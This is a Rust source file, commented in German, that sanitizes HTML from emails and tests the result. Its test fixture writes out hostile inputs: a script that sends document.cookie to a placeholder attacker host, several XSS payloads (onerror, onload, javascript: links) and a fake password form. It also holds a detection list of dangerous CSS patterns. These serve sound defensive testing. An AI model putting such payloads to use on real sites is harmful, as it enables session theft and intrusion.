//! HTML aus Mails bereinigen.
//!
//! Entfernt wird alles, was Code ausführen, Daten senden oder ungefragt etwas aus dem
//! Netz laden kann: Skripte, Formulare, iframes/objects, Event-Attribute (`onerror` …),
//! `javascript:`-Links, CSS mit `url()`, `<style>`-Blöcke und externe Bilder.
//!
//! Externe Bilder werden standardmässig entfernt und gezählt. Erst wenn der Nutzer
//! „Externe Inhalte laden“ wählt, werden sie (nur über HTTPS) vom Backend geladen und als
//! `data:`-Adressen eingesetzt. Die Anzeige selbst lädt nie etwas aus dem Netz.

use std::collections::{HashMap, HashSet};
use std::sync::{Arc, Mutex};

/// Höchstmenge an Bilddaten (Bytes der `data:`-Adressen), die durch *wiederholte*
/// Verwendung desselben Bildes eingesetzt wird. Jedes Bild wird beim ersten Vorkommen
/// immer eingesetzt (seine Grösse ist durch die Mail bzw. das Laden begrenzt); erst
/// jede weitere Kopie zählt gegen dieses Budget. Sonst könnte eine kleine Mail mit
/// tausenden Verweisen auf ein grosses Bild beim Öffnen den Speicher füllen.
const MAX_WIEDERHOLTE_BILDDATEN: usize = 16 * 1024 * 1024;

/// Merkt sich, welche Bilder schon eingesetzt wurden und wie viel Budget übrig ist.
struct Bildbudget {
    eingesetzt: HashSet<String>,
    rest: usize,
}

impl Bildbudget {
    fn neu() -> Self {
        Self {
            eingesetzt: HashSet::new(),
            rest: MAX_WIEDERHOLTE_BILDDATEN,
        }
    }

    /// Gibt die `data:`-Adresse zurück, wenn sie (noch) eingesetzt werden darf.
    fn einsetzen(&mut self, schluessel: &str, daten: &str) -> Option<String> {
        if self.eingesetzt.insert(schluessel.to_string()) {
            return Some(daten.to_string());
        }
        self.rest = self.rest.checked_sub(daten.len())?;
        Some(daten.to_string())
    }
}

/// Ergebnis der Bereinigung.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct BereinigtesHtml {
    pub html: String,
    /// Adressen externer Bilder, die nicht angezeigt werden (blockiert oder nicht ladbar).
    pub blockiert: Vec<String>,
}

/// Erlaubte Bildtypen für `data:`-Adressen.
const BILD_DATENTYPEN: [&str; 4] = [
    "data:image/png;",
    "data:image/jpeg;",
    "data:image/gif;",
    "data:image/webp;",
];

fn ist_erlaubtes_datenbild(wert: &str) -> bool {
    let klein = wert.trim_start().to_ascii_lowercase();
    BILD_DATENTYPEN.iter().any(|p| klein.starts_with(p)) && klein.contains(";base64,")
}

fn ist_extern(wert: &str) -> bool {
    let klein = wert.trim_start().to_ascii_lowercase();
    klein.starts_with("https:") || klein.starts_with("http:") || klein.starts_with("//")
}

fn ist_erlaubter_link(wert: &str) -> bool {
    let klein = wert.trim_start().to_ascii_lowercase();
    klein.starts_with("https:") || klein.starts_with("http:") || klein.starts_with("mailto:")
}

/// CSS in `style`-Attributen, das etwas nachladen oder ausführen könnte.
///
/// CSS-Escapes (`\75 rl(`) werden nicht aufgelöst; Werte mit Backslash werden deshalb
/// immer verworfen.
fn ist_gefaehrliches_css(wert: &str) -> bool {
    if wert.contains('\\') {
        return true;
    }
    let klein: String = wert
        .to_ascii_lowercase()
        .chars()
        .filter(|c| !c.is_whitespace() && *c != '\\')
        .collect();
    [
        "url(",
        "expression(",
        "@import",
        "behavior:",
        "-moz-binding",
        "image-set(",
        "javascript:",
    ]
    .iter()
    .any(|m| klein.contains(m))
}

/// Bereinigt HTML aus einer Mail.
///
/// - `eingebettet`: Bilder aus der Mail selbst (`cid:`-Verweise) als `data:`-Adressen.
/// - `extern_geladen`: bereits geladene externe Bilder (Adresse → `data:`-Adresse), oder
///   `None`, wenn externe Inhalte blockiert sind.
pub fn bereinigen(
    html: &str,
    eingebettet: &HashMap<String, String>,
    extern_geladen: Option<&HashMap<String, String>>,
) -> BereinigtesHtml {
    let blockiert = Arc::new(Mutex::new(Vec::<String>::new()));
    let blockiert_kopie = blockiert.clone();
    let budget = Mutex::new(Bildbudget::neu());
    let eingebettet = eingebettet.clone();
    let extern_geladen = extern_geladen.cloned();

    let mut tag_attribute: HashMap<&str, HashSet<&str>> = HashMap::new();
    let tabellen = ["align", "valign", "width", "height", "bgcolor", "border"];
    for (tag, attribute) in [
        (
            "table",
            &[&tabellen[..], &["cellpadding", "cellspacing"]].concat()[..],
        ),
        (
            "td",
            &[&tabellen[..], &["colspan", "rowspan", "nowrap"]].concat()[..],
        ),
        (
            "th",
            &[&tabellen[..], &["colspan", "rowspan", "nowrap"]].concat()[..],
        ),
        ("tr", &tabellen[..]),
        ("tbody", &["align", "valign"][..]),
        ("thead", &["align", "valign"][..]),
        (
            "img",
            &["align", "alt", "height", "src", "width", "border", "title"][..],
        ),
        ("font", &["color", "face", "size"][..]),
        ("p", &["align"][..]),
        ("div", &["align"][..]),
        ("h1", &["align"][..]),
        ("h2", &["align"][..]),
        ("h3", &["align"][..]),
        ("hr", &["align", "width", "size", "color"][..]),
        ("a", &["href", "title", "name"][..]),
        ("ol", &["start", "type"][..]),
        ("ul", &["type"][..]),
        ("li", &["value", "type"][..]),
        ("blockquote", &["cite", "type"][..]),
    ] {
        tag_attribute
            .entry(tag)
            .or_default()
            .extend(attribute.iter().copied());
    }

    let mut builder = ammonia::Builder::default();
    builder
        .add_tags(["font", "center"])
        .tag_attributes(tag_attribute)
        .add_generic_attributes(["style", "dir", "lang", "title"])
        .url_schemes(HashSet::from(["http", "https", "mailto", "cid", "data"]))
        .url_relative(ammonia::UrlRelative::Deny)
        .link_rel(Some("noopener noreferrer"))
        .strip_comments(true)
        .attribute_filter(move |element, attribut, wert| match (element, attribut) {
            ("a" | "area", "href") => ist_erlaubter_link(wert).then(|| wert.into()),
            ("img", "src") => {
                let wert_klein = wert.trim().to_ascii_lowercase();
                if let Some(cid) = wert_klein.strip_prefix("cid:") {
                    let cid = cid.trim_matches(|c| c == '<' || c == '>');
                    let daten = eingebettet.get(cid)?;
                    return budget
                        .lock()
                        .ok()?
                        .einsetzen(&format!("cid:{cid}"), daten)
                        .map(Into::into);
                }
                if ist_erlaubtes_datenbild(wert) {
                    return Some(wert.into());
                }
                if ist_extern(wert) {
                    if let Some(geladen) = extern_geladen.as_ref().and_then(|m| m.get(wert.trim()))
                    {
                        let eingesetzt = budget
                            .lock()
                            .ok()
                            .and_then(|mut b| b.einsetzen(wert.trim(), geladen));
                        if let Some(daten) = eingesetzt {
                            return Some(daten.into());
                        }
                    }
                    if let Ok(mut liste) = blockiert_kopie.lock() {
                        liste.push(wert.trim().to_string());
                    }
                }
                None
            }
            (_, "src" | "href" | "background" | "srcset" | "cite") => None,
            (_, "style") => (!ist_gefaehrliches_css(wert)).then(|| wert.into()),
            _ => Some(wert.into()),
        });

    let html = builder.clean(html).to_string();
    let blockiert = blockiert.lock().map(|l| l.clone()).unwrap_or_default();
    BereinigtesHtml { html, blockiert }
}

#[cfg(test)]
mod tests {
    use super::*;

    const BOESE: &str = r#"
        <html><head>
          <script>alert('kopf')</script>
          <style>body { background: url(https://tracker.example/css.png) }</style>
          <meta http-equiv="refresh" content="0; url=https://boese.example/">
          <base href="https://boese.example/">
          <link rel="stylesheet" href="https://boese.example/x.css">
        </head>
        <body onload="alert('body')">
          <p>Hallo <b>Welt</b></p>
          <script>document.location='https://boese.example/?c='+document.cookie</script>
          <img src="https://tracker.example/pixel.gif" width="1" height="1">
          <img src="x" onerror="alert('onerror')">
          <img src="javascript:alert(1)">
          <img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">
          <img src="data:image/png;base64,iVBORw0KGgo=" alt="ok">
          <img src="cid:bild1@mail">
          <iframe src="https://boese.example/frame"></iframe>
          <object data="https://boese.example/x.swf"></object>
          <embed src="https://boese.example/x.swf">
          <form action="https://boese.example/login"><input name="pw" type="password"><button>Senden</button></form>
          <a href="javascript:alert('link')">Klick</a>
          <a href="https://bank.example/" onclick="alert(1)">https://bank.example/</a>
          <a href="mailto:anna@example.org">Mail</a>
          <div style="background-image: url('https://tracker.example/bg.png')">CSS-Tracking</div>
          <div style="color: red">Rot</div>
          <table background="https://tracker.example/tab.png"><tr><td>Zelle</td></tr></table>
          <svg onload="alert('svg')"><circle r="5"/></svg>
          <math><mi xlink:href="javascript:alert(1)">x</mi></math>
          <video src="https://boese.example/v.mp4" poster="https://tracker.example/p.png"></video>
          <audio src="https://boese.example/a.mp3"></audio>
          <!-- <img src="https://tracker.example/kommentar.png"> -->
        </body></html>
    "#;

    fn eingebettet() -> HashMap<String, String> {
        HashMap::from([(
            "bild1@mail".to_string(),
            "data:image/png;base64,AAAA".to_string(),
        )])
    }

    #[test]
    fn skripte_tracking_und_event_attribute_werden_entfernt() {
        let ergebnis = bereinigen(BOESE, &eingebettet(), None);
        let html = ergebnis.html.to_ascii_lowercase();
        for verboten in [
            "<script",
            "alert(",
            "onload",
            "onerror",
            "onclick",
            "javascript:",
            "<iframe",
            "<object",
            "<embed",
            "<form",
            "<input",
            "<button",
            "<style",
            "<meta",
            "<base",
            "<link",
            "<svg",
            "<video",
            "<audio",
            "url(",
            "tracker.example",
            "boese.example",
            "image/svg",
        ] {
            assert!(
                !html.contains(verboten),
                "„{verboten}“ steht noch drin: {html}"
            );
        }
        // Erlaubtes bleibt erhalten.
        assert!(html.contains("<b>welt</b>"));
        assert!(html.contains("data:image/png;base64,ivborw0kggo="));
        assert!(
            html.contains("data:image/png;base64,aaaa"),
            "cid-Bild eingesetzt"
        );
        assert!(html.contains(r#"href="https://bank.example/""#));
        assert!(html.contains(r#"rel="noopener noreferrer""#));
        assert!(html.contains("mailto:anna@example.org"));
        assert!(html.contains("color: red"));
        assert!(html.contains("zelle"));
    }

    #[test]
    fn externe_bilder_werden_gezaehlt_und_erst_auf_wunsch_eingesetzt() {
        let ergebnis = bereinigen(BOESE, &eingebettet(), None);
        assert_eq!(
            ergebnis.blockiert,
            vec!["https://tracker.example/pixel.gif".to_string()]
        );

        let geladen = HashMap::from([(
            "https://tracker.example/pixel.gif".to_string(),
            "data:image/gif;base64,R0lGODlh".to_string(),
        )]);
        let ergebnis = bereinigen(BOESE, &eingebettet(), Some(&geladen));
        assert!(ergebnis.blockiert.is_empty());
        assert!(ergebnis.html.contains("data:image/gif;base64,R0lGODlh"));
        assert!(!ergebnis.html.contains("https://tracker.example"));
    }

    #[test]
    fn wiederholte_bilder_fuellen_den_speicher_nicht() {
        // 1 MB Bild, 200 Verweise darauf: ohne Grenze wären das rund 200 MB HTML.
        let gross = format!("data:image/png;base64,{}", "A".repeat(1024 * 1024));
        let eingebettet = HashMap::from([("bild@mail".to_string(), gross.clone())]);
        let html = r#"<img src="cid:bild@mail">"#.repeat(200);
        let ergebnis = bereinigen(&html, &eingebettet, None);
        assert!(ergebnis.html.len() <= MAX_WIEDERHOLTE_BILDDATEN + 2 * gross.len());
        // Das Bild selbst wird angezeigt (mindestens einmal und mehrfach im Budget).
        assert!(ergebnis.html.matches(&gross).count() >= 2);

        // Dasselbe für geladene externe Bilder; was nicht mehr passt, gilt als blockiert.
        let adresse = "https://bilder.example/gross.png";
        let geladen = HashMap::from([(adresse.to_string(), gross.clone())]);
        let html = format!(r#"<img src="{adresse}">"#).repeat(200);
        let ergebnis = bereinigen(&html, &HashMap::new(), Some(&geladen));
        assert!(ergebnis.html.len() <= MAX_WIEDERHOLTE_BILDDATEN + 2 * gross.len());
        assert!(!ergebnis.blockiert.is_empty());
    }

    #[test]
    fn verschiedene_bilder_werden_alle_eingesetzt() {
        let bild = |n: usize| format!("data:image/png;base64,{}{n}", "A".repeat(4 * 1024 * 1024));
        let eingebettet: HashMap<String, String> =
            (0..6).map(|n| (format!("b{n}@mail"), bild(n))).collect();
        let html: String = (0..6)
            .map(|n| format!(r#"<img src="cid:b{n}@mail">"#))
            .collect();
        let ergebnis = bereinigen(&html, &eingebettet, None);
        for n in 0..6 {
            assert!(ergebnis.html.contains(&bild(n)), "Bild {n} fehlt");
        }
    }

    #[test]
    fn gefaehrliches_css_wird_erkannt() {
        assert!(ist_gefaehrliches_css("background:URL(x)"));
        assert!(ist_gefaehrliches_css("background: u\\72 l(x)"));
        assert!(ist_gefaehrliches_css("width: expression(alert(1))"));
        assert!(!ist_gefaehrliches_css("color: red; font-weight: bold"));
    }
}
